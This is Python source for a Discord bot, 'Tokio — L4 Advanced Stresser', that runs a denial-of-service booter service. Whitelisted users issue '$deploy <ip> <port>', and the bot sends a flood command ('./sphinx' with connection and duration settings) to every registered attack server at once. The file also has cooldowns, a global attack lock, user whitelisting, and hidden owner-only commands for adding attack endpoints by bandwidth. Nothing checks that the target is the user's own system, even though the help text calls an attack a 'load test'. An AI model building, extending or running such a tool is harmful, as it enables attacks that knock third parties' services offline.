"""
Tokio — L4 Advanced Stresser Discord Bot
Author: Arkdiv
"""

import asyncio
import ipaddress
import os
import time
from typing import Optional

import aiohttp
import discord
from discord.ext import commands
from dotenv import load_dotenv

import config

load_dotenv()

# ── Environment ────────────────────────────────────────────────────────────────
BOT_TOKEN: str = os.getenv("BOT_TOKEN", "")
OWNER_ID: int = int(os.getenv("OWNER_ID", "0"))

if not BOT_TOKEN:
    raise RuntimeError("[Tokio] BOT_TOKEN is not set in .env")
if not OWNER_ID:
    raise RuntimeError("[Tokio] OWNER_ID is not set in .env")

# ── State ──────────────────────────────────────────────────────────────────────
whitelist: set[int]            = {OWNER_ID}
endpoints: dict[str, dict]     = {}
cooldowns: dict[int, float]    = {}
spam_tracker: dict[int, list]  = {}

# Timestamp of the last successful deploy (monotonic). None = no attack yet.
last_attack_at: Optional[float] = None

http_session: Optional[aiohttp.ClientSession] = None

# ── Bot ────────────────────────────────────────────────────────────────────────
intents = discord.Intents.default()
intents.message_content = True

bot = commands.Bot(
    command_prefix="$",
    intents=intents,
    help_command=None,
    case_insensitive=True,
)

# ── Helpers ────────────────────────────────────────────────────────────────────

def make_embed(title: str, description: str = "") -> discord.Embed:
    e = discord.Embed(title=title, description=description or None, color=config.EMBED_COLOR)
    e.set_footer(text=config.BRAND_FOOTER)
    return e


def is_owner(uid: int) -> bool:
    return uid == OWNER_ID


def is_whitelisted(uid: int) -> bool:
    return uid in whitelist


def lock_remaining() -> int:
    """Seconds remaining on the global attack lock. 0 = unlocked."""
    if last_attack_at is None:
        return 0
    elapsed = time.monotonic() - last_attack_at
    rem = config.ATTACK_LOCK_SECONDS - elapsed
    return max(0, int(rem) + 1) if rem > 0 else 0


def cooldown_remaining(uid: int) -> int:
    """Per-user cooldown remaining. Owner always 0."""
    if is_owner(uid):
        return 0
    elapsed = time.monotonic() - cooldowns.get(uid, 0.0)
    rem = config.COOLDOWN_SECONDS - elapsed
    return max(0, int(rem) + 1) if rem > 0 else 0


def set_cooldown(uid: int) -> None:
    if not is_owner(uid):
        cooldowns[uid] = time.monotonic()


def is_spam(uid: int) -> bool:
    """True if user sent more than 5 commands in the last 10 seconds."""
    if is_owner(uid):
        return False
    now = time.monotonic()
    history = [t for t in spam_tracker.get(uid, []) if now - t < 10.0]
    history.append(now)
    spam_tracker[uid] = history
    return len(history) > 5


def validate_ipv4(ip: str) -> bool:
    try:
        ipaddress.IPv4Address(ip)
        return True
    except ValueError:
        return False


def validate_port(raw: str) -> Optional[int]:
    try:
        p = int(raw)
        return p if 1 <= p <= 65535 else None
    except (ValueError, TypeError):
        return None


def build_command(ip: str, port: int) -> str:
    return (
        f"./sphinx -H {ip} -P {port}"
        f" -c {config.DEFAULT_CONNECTIONS}"
        f" -d {config.DEFAULT_DURATION}"
    )


async def _post_silent(url: str, payload: dict, timeout: aiohttp.ClientTimeout) -> None:
    """Fire-and-forget POST. All errors silently discarded."""
    try:
        async with http_session.post(url, json=payload, timeout=timeout):
            pass
    except Exception:
        pass


async def fire_all_endpoints(ip: str, port: int) -> None:
    """Dispatch the attack command to every endpoint simultaneously."""
    payload = {
        "command": build_command(ip, port),
        "host": ip,
        "port": port,
        "connections": config.DEFAULT_CONNECTIONS,
        "duration": config.DEFAULT_DURATION,
    }
    timeout = aiohttp.ClientTimeout(
        connect=config.HTTP_TIMEOUT_CONNECT,
        total=config.HTTP_TIMEOUT_TOTAL,
    )
    await asyncio.gather(
        *[_post_silent(f"{ep['url']}/deploy", payload, timeout) for ep in endpoints.values()],
        return_exceptions=True,
    )


# ── Events ─────────────────────────────────────────────────────────────────────

@bot.event
async def on_ready():
    global http_session
    connector = aiohttp.TCPConnector(
        limit=config.HTTP_CONNECTOR_LIMIT,
        keepalive_timeout=config.HTTP_KEEPALIVE_TIMEOUT,
        enable_cleanup_closed=True,
        force_close=False,
    )
    http_session = aiohttp.ClientSession(
        connector=connector,
        headers={"Content-Type": "application/json", "User-Agent": "Tokio/1.0"},
    )
    await bot.change_presence(
        activity=discord.Activity(type=discord.ActivityType.watching, name="Tokio Systems"),
        status=discord.Status.online,
    )
    print(f"[Tokio] Online as {bot.user} ({bot.user.id})")


@bot.event
async def on_disconnect():
    print("[Tokio] Disconnected.")


@bot.event
async def on_error(event: str, *args, **kwargs):
    import traceback
    print(f"[Tokio] Error in '{event}':")
    traceback.print_exc()


@bot.event
async def on_command_error(ctx: commands.Context, error: commands.CommandError):
    if isinstance(error, (commands.CommandNotFound, commands.MissingRequiredArgument)):
        return
    print(f"[Tokio] Command error in '{ctx.command}': {error}")


# ── Commands ───────────────────────────────────────────────────────────────────

@bot.command(name="help")
async def cmd_help(ctx: commands.Context):
    if is_spam(ctx.author.id):
        return
    e = make_embed("Tokio — L4 Advanced Stresser")
    e.add_field(name="$deploy <ipv4> <port>", value="Launch a load test against the target.", inline=False)
    e.add_field(name="$whitelist <add|remove> <@user>", value="Manage authorized users.", inline=False)
    await ctx.reply(embed=e, mention_author=False)


@bot.command(name="deploy")
async def cmd_deploy(ctx: commands.Context, *args):
    global last_attack_at
    uid = ctx.author.id

    if is_spam(uid):
        return

    if not is_whitelisted(uid):
        return await ctx.reply(
            embed=make_embed("Access Denied", "You are not authorized."),
            mention_author=False,
        )

    # Global backend lock — owner bypasses
    locked = lock_remaining()
    if locked > 0 and not is_owner(uid):
        return await ctx.reply(
            embed=make_embed("Backend Busy", f"Tokio Backend Busy, try again in **{locked}s**."),
            mention_author=False,
        )

    # Per-user cooldown
    rem = cooldown_remaining(uid)
    if rem > 0:
        return await ctx.reply(
            embed=make_embed("Cooldown", f"Wait **{rem}s** before deploying again."),
            mention_author=False,
        )

    if len(args) < 2:
        return await ctx.reply(
            embed=make_embed("Usage", "`$deploy <ipv4> <port>`"),
            mention_author=False,
        )

    raw_ip, raw_port = args[0], args[1]

    if not validate_ipv4(raw_ip):
        return await ctx.reply(
            embed=make_embed("Invalid Target", "Not a valid IPv4 address."),
            mention_author=False,
        )

    port = validate_port(raw_port)
    if port is None:
        return await ctx.reply(
            embed=make_embed("Invalid Port", "Port must be between 1 and 65535."),
            mention_author=False,
        )

    if not endpoints:
        return await ctx.reply(
            embed=make_embed("Offline", "No endpoints configured. Contact the owner."),
            mention_author=False,
        )

    # Lock the backend and apply user cooldown before any async work
    last_attack_at = time.monotonic()
    set_cooldown(uid)

    pending = make_embed("Deploying", f"Sending command to {len(endpoints)} endpoint(s)...")
    pending.add_field(name="Target",      value=f"{raw_ip}:{port}",            inline=True)
    pending.add_field(name="Duration",    value=f"{config.DEFAULT_DURATION}s", inline=True)
    pending.add_field(name="Connections", value=str(config.DEFAULT_CONNECTIONS), inline=True)
    pending_msg = await ctx.reply(embed=pending, mention_author=False)

    asyncio.create_task(fire_all_endpoints(raw_ip, port))

    await asyncio.sleep(3)

    done = make_embed("Attack Deployed", "Attack Deployed...")
    done.add_field(name="Target",      value=f"{raw_ip}:{port}",              inline=True)
    done.add_field(name="Duration",    value=f"{config.DEFAULT_DURATION}s",   inline=True)
    done.add_field(name="Connections", value=str(config.DEFAULT_CONNECTIONS), inline=True)
    done.add_field(name="Lock Expires", value=f"<t:{int(time.time()) + config.ATTACK_LOCK_SECONDS}:R>", inline=True)
    await pending_msg.edit(embed=done)


@bot.command(name="whitelist")
async def cmd_whitelist(ctx: commands.Context, *args):
    uid = ctx.author.id

    if is_spam(uid):
        return

    if not is_owner(uid):
        return await ctx.reply(
            embed=make_embed("Access Denied", "Owner only."),
            mention_author=False,
        )

    if not args or args[0].lower() not in ("add", "remove"):
        return await ctx.reply(
            embed=make_embed("Usage", "`$whitelist <add|remove> <@user>`"),
            mention_author=False,
        )

    if not ctx.message.mentions:
        return await ctx.reply(
            embed=make_embed("Missing User", "Mention a user."),
            mention_author=False,
        )

    action = args[0].lower()
    target = ctx.message.mentions[0]

    if action == "add":
        whitelist.add(target.id)
        return await ctx.reply(
            embed=make_embed("Whitelist", f"{target.name} granted access."),
            mention_author=False,
        )

    if target.id == OWNER_ID:
        return await ctx.reply(
            embed=make_embed("Denied", "Cannot remove the owner."),
            mention_author=False,
        )

    whitelist.discard(target.id)
    await ctx.reply(
        embed=make_embed("Whitelist", f"{target.name} revoked."),
        mention_author=False,
    )


# ── Owner-only hidden commands ─────────────────────────────────────────────────

@bot.command(name="endpoints")
async def cmd_endpoints(ctx: commands.Context, *args):
    if not is_owner(ctx.author.id):
        return

    if not args:
        return await ctx.reply(
            embed=make_embed("Usage", "`$endpoints <add|remove|list>`"),
            mention_author=False,
        )

    action = args[0].lower()

    if action == "list":
        if not endpoints:
            return await ctx.reply(embed=make_embed("Endpoints", "None configured."), mention_author=False)
        lines = [
            f"Name   : {ep['name']}\nOutput : {ep['output']}\nURL    : {ep['url']}"
            for ep in endpoints.values()
        ]
        return await ctx.reply(
            embed=make_embed(f"Endpoints ({len(endpoints)})", "```\n" + "\n\n".join(lines) + "\n```"),
            mention_author=False,
        )

    if action == "add":
        if len(args) < 4:
            return await ctx.reply(
                embed=make_embed(
                    "Usage",
                    "`$endpoints add <name> <output> <url>`\n"
                    "Example: `$endpoints add VM-1 <1Gbps http://1.2.3.4:8080`",
                ),
                mention_author=False,
            )
        name, output, url = args[1], args[2], args[3].rstrip("/")
        if not url.startswith(("http://", "https://")):
            return await ctx.reply(
                embed=make_embed("Invalid URL", "Must start with http:// or https://"),
                mention_author=False,
            )
        endpoints[name] = {"name": name, "output": output, "url": url}
        return await ctx.reply(
            embed=make_embed("Endpoint Added", f"**{name}** registered.\nOutput: {output}\nURL: {url}"),
            mention_author=False,
        )

    if action == "remove":
        if len(args) < 2:
            return await ctx.reply(embed=make_embed("Usage", "`$endpoints remove <name>`"), mention_author=False)
        name = args[1]
        if name not in endpoints:
            return await ctx.reply(
                embed=make_embed("Not Found", f"No endpoint named **{name}**."),
                mention_author=False,
            )
        del endpoints[name]
        return await ctx.reply(
            embed=make_embed("Endpoint Removed", f"**{name}** removed."),
            mention_author=False,
        )

    await ctx.reply(embed=make_embed("Usage", "`$endpoints <add|remove|list>`"), mention_author=False)


# ── Shutdown & Entry ───────────────────────────────────────────────────────────

async def shutdown() -> None:
    global http_session
    if http_session and not http_session.closed:
        await http_session.close()
    await bot.close()


async def main() -> None:
    try:
        await bot.start(BOT_TOKEN)
    except discord.LoginFailure:
        print("[Tokio] Invalid BOT_TOKEN — check your .env file.")
    except KeyboardInterrupt:
        print("[Tokio] Shutting down.")
    except Exception as exc:
        print(f"[Tokio] Fatal: {exc}")
    finally:
        await shutdown()


if __name__ == "__main__":
    asyncio.run(main())
